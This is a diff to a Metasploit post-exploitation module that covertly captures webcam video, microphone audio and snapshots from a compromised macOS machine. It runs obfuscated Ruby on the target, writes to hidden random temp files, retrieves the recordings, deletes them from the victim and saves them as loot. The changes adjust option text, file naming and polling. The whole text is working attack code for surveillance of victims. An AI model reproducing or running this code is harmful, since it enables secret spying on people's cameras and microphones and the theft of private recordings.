@@ -36,8 +36,8 @@ class Metasploit3 < Msf::Post
 
     register_options(
       [
-        OptInt.new('CAMERA_INDEX', [true, 'The index of the webcam to use. `set ACTION LIST` to get a list.', 0]),
-        OptInt.new('MIC_INDEX', [true, 'The index of the mic to use. `set ACTION LIST` to get a list.', 0]),
+        OptInt.new('CAMERA_INDEX', [true, 'The index of the webcam to use.', 0]),
+        OptInt.new('MIC_INDEX', [true, 'The index of the mic to use.', 0]),
         OptString.new('JPG_QUALITY', [false, 'The compression factor for snapshotting a jpg (from 0 to 1)', "0.8"]),
         OptString.new('TMP_FILE',
           [true, 'The tmp file to use on the remote machine', '/tmp/.<random>/<random>']
@@ -59,7 +59,7 @@ class Metasploit3 < Msf::Post
     fail_with("Invalid action") if action.nil?
 
     num_chunks = (datastore['RECORD_LEN'].to_f/datastore['SYNC_WAIT'].to_f).ceil
-    tmp_file = datastore['TMP_FILE'].gsub('<random>') { Rex::Text.rand_text_alpha(10)+'1' }
+    tmp_file = "#{datastore['TMP_FILE']}.mov".gsub('<random>') { Rex::Text.rand_text_alpha(10)+'1' }
 
     ruby_code = osx_capture_media(
       :action => action.name.downcase,
@@ -76,6 +76,7 @@ class Metasploit3 < Msf::Post
       :snap_file => tmp_file+datastore['SNAP_FILETYPE']
     )
 
+
     # File.write('/Users/joe/Desktop/r3.rb', obfuscated_ruby_cmd(ruby_code))
     # return
 
@@ -90,8 +91,10 @@ class Metasploit3 < Msf::Post
       cmd_exec(obfuscated_ruby_cmd(ruby_code))
     end
 
+    # output = cmd_exec(obfuscated_ruby_cmd(ruby_code))
+
     if action.name =~ /list/i
-      print_good output
+      print_good "Detected devices:\n"+output
     elsif action.name =~ /record/i
       @pid = output.to_i
 
@@ -104,29 +107,29 @@ class Metasploit3 < Msf::Post
         # wait SYNC_WAIT seconds
         print_status "Waiting for #{datastore['SYNC_WAIT'].to_i} seconds"
         Rex.sleep(datastore['SYNC_WAIT'])
-        # start reading for file
+        # start polling the fs for the file
         begin
           ::Timeout.timeout(poll_timeout) do
             while true
-              if File.exist?(tmp_file)
+              # when done recording, a ".done" extension is added to the file
+              final_tmp_file = tmp_file+'.done'
+              if File.exist?(final_tmp_file)
                 # read file
-                contents = File.read(tmp_file)
+                contents = read_file(final_tmp_file)
                 # delete file
-                rm_f(tmp_file)
+                rm_f(final_tmp_file)
                 # roll filename
                 base = File.basename(tmp_file, '.*') # returns it with no extension
                 num = ((base.match(/\d+$/)||['0'])[0].to_i+1).to_s
-                ext = File.extname(tmp_file) || 'o'
-                tmp_file = File.join(File.dirname(tmp_file), base+num+'.'+ext)
+                ext = File.extname(tmp_file) || '.o'
+                tmp_file = File.join(File.dirname(tmp_file), base+num+ext)
                 # store contents in file
                 title = "OSX Webcam Recording "+i.to_s
-                f = store_loot(title, "video/mov", session, contents,
+                f = store_loot(title, "application/x-octet-stream", session, contents,
                   "osx_webcam_rec#{i}.mov", title)
                 print_good "Record file captured and saved to #{f}"
                 print_status "Rolling movie file. "
                 break
-              else
-                Rex.sleep(0.3)
               end
             end
           end
@@ -141,6 +144,7 @@ class Metasploit3 < Msf::Post
       end
 
       snap_type = datastore['SNAP_FILETYPE']
+      puts "Reading #{tmp_file+snap_type}..."
       img = read_file(tmp_file+snap_type)
       if img.present?
         f = store_loot("OSX Webcam Snapshot", "image/#{snap_type}",
